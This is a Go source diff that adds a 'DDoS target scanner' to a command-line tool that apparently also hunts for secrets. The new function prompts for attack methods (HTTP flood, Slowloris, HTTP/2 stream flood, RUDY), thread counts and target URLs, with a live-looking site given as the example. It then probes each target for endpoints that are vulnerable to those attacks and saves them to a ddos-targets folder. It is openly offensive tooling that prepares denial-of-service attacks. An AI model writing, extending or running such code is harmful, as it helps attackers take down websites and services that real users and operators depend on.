@@ -6,10 +6,13 @@ import (
 	"fmt"
 	"net/url"
 	"os"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"time"
 
+	"github.com/letgo/ddos"
+	"github.com/letgo/ddos-scanner"
 	"github.com/letgo/scanner"
 	"github.com/letgo/secretscanner"
 )
@@ -484,6 +487,312 @@ func (m *Menu) scanSecrets() {
 			fmt.Printf("Warning: Failed to write results to file: %v\n", err)
 		} else {
 			fmt.Printf("✓ Results saved to secrets-found.txt\n")
+		}
+	}
+
+	fmt.Println(strings.Repeat("=", 70))
+	fmt.Println("\nScan complete! Returning to main menu...")
+	fmt.Println()
+}
+
+// scanDDOSTarget scans a target website to find optimal cURL commands for DDoS attacks
+func (m *Menu) scanDDOSTarget() {
+	reader := bufio.NewReader(os.Stdin)
+
+	fmt.Println("\n" + strings.Repeat("=", 70))
+	fmt.Println("                    DDoS TARGET SCANNER")
+	fmt.Println(strings.Repeat("=", 70))
+	fmt.Println("\nThis tool will scan a website to find the best cURL commands")
+	fmt.Println("for different DDoS attack methods.")
+	fmt.Println()
+
+	// Display available attack methods
+	fmt.Println("\nAvailable Attack Methods:")
+	fmt.Println("  [1] Flood (HTTP Flood)")
+	fmt.Println("  [2] Slowloris")
+	fmt.Println("  [3] Mixed (Flood + Slowloris)")
+	fmt.Println("  [4] HTTP/2 Stream Flood")
+	fmt.Println("  [5] RUDY (Slow HTTP POST)")
+	fmt.Println("  [6] All Methods")
+	fmt.Print("\nSelect attack method(s) to scan for (comma-separated, e.g., 1,2,3 or 6 for all): ")
+	methodsStr, _ := reader.ReadString('\n')
+	methodsStr = strings.TrimSpace(methodsStr)
+
+	var selectedMethods []ddos.AttackMode
+	if methodsStr == "6" || strings.Contains(methodsStr, "all") || strings.Contains(methodsStr, "All") {
+		// Select all methods
+		selectedMethods = []ddos.AttackMode{
+			ddos.ModeFlood,
+			ddos.ModeSlowloris,
+			ddos.ModeMixed,
+			ddos.ModeHTTP2StreamFlood,
+			ddos.ModeRUDY,
+		}
+	} else {
+		// Parse selected methods
+		methodNumbers := strings.Split(methodsStr, ",")
+		for _, numStr := range methodNumbers {
+			numStr = strings.TrimSpace(numStr)
+			switch numStr {
+			case "1":
+				selectedMethods = append(selectedMethods, ddos.ModeFlood)
+			case "2":
+				selectedMethods = append(selectedMethods, ddos.ModeSlowloris)
+			case "3":
+				selectedMethods = append(selectedMethods, ddos.ModeMixed)
+			case "4":
+				selectedMethods = append(selectedMethods, ddos.ModeHTTP2StreamFlood)
+			case "5":
+				selectedMethods = append(selectedMethods, ddos.ModeRUDY)
+			}
+		}
+	}
+
+	if len(selectedMethods) == 0 {
+		fmt.Println("Error: No valid attack methods selected.")
+		return
+	}
+
+	// Ask for scan parameters
+	fmt.Print("\nEnter number of threads for scanning (default: 10): ")
+	threadsStr, _ := reader.ReadString('\n')
+	threadsStr = strings.TrimSpace(threadsStr)
+	threads := 10
+	if threadsStr != "" {
+		if t, err := strconv.Atoi(threadsStr); err == nil && t > 0 {
+			threads = t
+		}
+	}
+
+	fmt.Print("Enter timeout in seconds (default: 10): ")
+	timeoutStr, _ := reader.ReadString('\n')
+	timeoutStr = strings.TrimSpace(timeoutStr)
+	timeout := 10 * time.Second
+	if timeoutStr != "" {
+		if t, err := strconv.Atoi(timeoutStr); err == nil && t > 0 {
+			timeout = time.Duration(t) * time.Second
+		}
+	}
+
+	// Get URLs from user and scan immediately
+	fmt.Println("\nEnter target URLs (one per line, press Enter on empty line when done):")
+	fmt.Println("Example:")
+	fmt.Println("  https://ava.in.th/")
+	fmt.Println("  https://ava.in.th/api")
+	fmt.Println("  https://ava.in.th/login")
+	fmt.Println("  (press Enter on empty line to finish)")
+	fmt.Println()
+	
+	var inputURLs []string
+	var allResults []*ddosscanner.ScanResult
+	var combinedValidEndpoints = make(map[ddos.AttackMode][]ddosscanner.EndpointResult)
+	var totalDiscovered, totalValidated int
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+	
+	// Start scanning immediately as URLs are entered
+	for {
+		fmt.Print("URL (or Enter to finish): ")
+		urlInput, _ := reader.ReadString('\n')
+		urlInput = strings.TrimSpace(urlInput)
+		
+		if urlInput == "" {
+			// Empty line - check if we have URLs to process
+			if len(inputURLs) > 0 {
+				break
+			}
+			fmt.Println("  ⚠ Please enter at least one URL")
+			continue
+		}
+		
+		// Validate URL
+		parsed, err := url.Parse(urlInput)
+		if err != nil {
+			fmt.Printf("  ⚠ Invalid URL skipped: %s\n", urlInput)
+			continue
+		}
+		
+		// Set default protocol if missing
+		if parsed.Scheme == "" {
+			parsed.Scheme = "https"
+			urlInput = parsed.String()
+		}
+		
+		inputURLs = append(inputURLs, urlInput)
+		
+		// Truncate URL for display if too long
+		displayURL := urlInput
+		if len(displayURL) > 50 {
+			displayURL = displayURL[:47] + "..."
+		}
+		
+		fmt.Printf("  ✓ Added: %s\n", urlInput)
+		fmt.Print("  → Scanning... ")
+		
+		// Create scan config for this URL
+		config := ddosscanner.ScanConfig{
+			TargetURL:     urlInput,
+			AttackMethods: selectedMethods,
+			MaxThreads:    threads,
+			Timeout:       timeout,
+			MaxDepth:      0, // No crawling
+			MaxPages:      0, // No crawling
+			UserAgent:     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+			OnProgress: func(phase string, current, total int, percentage float64) {
+				// Real-time progress display with cleaner format
+				if total > 0 {
+					// Show progress bar
+					barWidth := 30
+					filled := int(float64(barWidth) * percentage / 100.0)
+					bar := strings.Repeat("█", filled) + strings.Repeat("░", barWidth-filled)
+					fmt.Printf("\r  → [%s] %s: %d/%d (%.1f%%) %s", displayURL, phase, current, total, percentage, bar)
+				} else {
+					fmt.Printf("\r  → [%s] %s...", displayURL, phase)
+				}
+				os.Stdout.Sync() // Force flush for real-time display
+			},
+		}
+		
+		// Create scanner and scan immediately
+		scannerInstance, err := ddosscanner.NewTargetScanner(config)
+		if err != nil {
+			fmt.Printf("\r  ⚠ Error creating scanner for %s: %v\n", urlInput, err)
+			continue
+		}
+		
+		// Scan this URL
+		result, err := scannerInstance.Scan(ctx)
+		if err != nil {
+			fmt.Printf("\r  ⚠ Error scanning %s: %v\n", urlInput, err)
+			continue
+		}
+		
+		// Clear progress line and show result
+		fmt.Print("\r" + strings.Repeat(" ", 100) + "\r")
+		
+		// Count valid endpoints for this URL
+		validCount := 0
+		for _, endpoints := range result.ValidEndpoints {
+			validCount += len(endpoints)
+		}
+		
+		if validCount > 0 {
+			fmt.Printf("  ✓ Scanned: %s - Found %d valid endpoint(s)\n", urlInput, validCount)
+		} else {
+			fmt.Printf("  ⚠ Scanned: %s - No valid endpoints found\n", urlInput)
+		}
+		
+		allResults = append(allResults, result)
+		totalDiscovered += result.TotalDiscovered
+		totalValidated += result.TotalValidated
+		
+		// Combine valid endpoints
+		for attackMode, endpoints := range result.ValidEndpoints {
+			combinedValidEndpoints[attackMode] = append(combinedValidEndpoints[attackMode], endpoints...)
+		}
+		
+		// Save result immediately
+		if err := scannerInstance.SaveResults(result); err != nil {
+			fmt.Printf("  ⚠ Error saving results for %s: %v\n", urlInput, err)
+		}
+	}
+	
+	if len(inputURLs) == 0 {
+		fmt.Println("Error: No valid URLs provided.")
+		return
+	}
+	
+	fmt.Printf("\n✓ Total URLs scanned: %d\n", len(inputURLs))
+
+	// Results are already collected from real-time scanning above
+	hasValidEndpoints := false
+	for _, endpoints := range combinedValidEndpoints {
+		if len(endpoints) > 0 {
+			hasValidEndpoints = true
+			break
+		}
+	}
+
+	// Display combined results
+	fmt.Println("\n" + strings.Repeat("=", 70))
+	fmt.Println("                    SCAN RESULTS")
+	fmt.Println(strings.Repeat("=", 70))
+	fmt.Printf("Total URLs Scanned: %d\n", len(inputURLs))
+	fmt.Printf("Total Endpoints Discovered: %d\n", totalDiscovered)
+	fmt.Printf("Total Endpoints Validated: %d\n", totalValidated)
+	fmt.Println(strings.Repeat("=", 70))
+
+	// Display results by attack method
+	for attackMode, endpoints := range combinedValidEndpoints {
+		if len(endpoints) > 0 {
+			fmt.Printf("\n[%s] Valid Endpoints: %d\n", strings.ToUpper(string(attackMode)), len(endpoints))
+			fmt.Println(strings.Repeat("-", 70))
+			for i, endpoint := range endpoints {
+				if i >= 10 { // Limit display to first 10
+					fmt.Printf("  ... and %d more endpoints\n", len(endpoints)-10)
+					break
+				}
+				fmt.Printf("  [%d] %s %s\n", i+1, endpoint.Method, endpoint.URL)
+				fmt.Printf("      Status: %d | Response Time: %v\n", endpoint.StatusCode, endpoint.ResponseTime)
+				if endpoint.SupportsHTTP2 {
+					fmt.Printf("      ✓ Supports HTTP/2\n")
+				}
+				if endpoint.KeepsConnection {
+					fmt.Printf("      ✓ Keeps connection alive\n")
+				}
+				if endpoint.AcceptsLargeBody {
+					fmt.Printf("      ✓ Accepts large body (up to %d bytes)\n", endpoint.MaxBodySize)
+				}
+			}
+		}
+	}
+
+	// Save results to files (use first URL's site name or combined)
+	if len(allResults) > 0 {
+		fmt.Println("\n" + strings.Repeat("=", 70))
+		fmt.Println("Saving results to files...")
+		
+		// Results are already saved during real-time scanning
+		// Just show summary of saved files
+		if len(allResults) > 1 {
+			// Multiple URLs - show combined summary
+			siteName := "multiple-targets"
+			fmt.Println("✓ Results saved to ddos-targets/ folder:")
+			for attackMode, endpoints := range combinedValidEndpoints {
+				if len(endpoints) > 0 {
+					methodName := string(attackMode)
+					filename := ddosscanner.GenerateFileName(methodName, siteName)
+					fmt.Printf("  • %s (%d endpoints)\n", filepath.Join("ddos-targets", filename), len(endpoints))
+				}
+			}
+			// Also show individual files
+			fmt.Println("\nIndividual URL results:")
+			for i, result := range allResults {
+				siteName := ddosscanner.ExtractSiteName(inputURLs[i])
+				for attackMode, endpoints := range result.ValidEndpoints {
+					if len(endpoints) > 0 {
+						methodName := string(attackMode)
+						filename := ddosscanner.GenerateFileName(methodName, siteName)
+						fmt.Printf("  • %s (%d endpoints)\n", filepath.Join("ddos-targets", filename), len(endpoints))
+					}
+				}
+			}
+		} else if len(allResults) == 1 {
+			// Single URL result
+			siteName := ddosscanner.ExtractSiteName(inputURLs[0])
+			fmt.Println("✓ Results saved to ddos-targets/ folder:")
+			for attackMode, endpoints := range combinedValidEndpoints {
+				if len(endpoints) > 0 {
+					methodName := string(attackMode)
+					filename := ddosscanner.GenerateFileName(methodName, siteName)
+					fmt.Printf("  • %s (%d endpoints)\n", filepath.Join("ddos-targets", filename), len(endpoints))
+				}
+			}
+		}
+		
+		if !hasValidEndpoints {
+			fmt.Println("\n⚠ No endpoints met the validation criteria for selected attack methods.")
+			fmt.Println("  Please try different URLs or attack methods.")
 		}
 	}
 
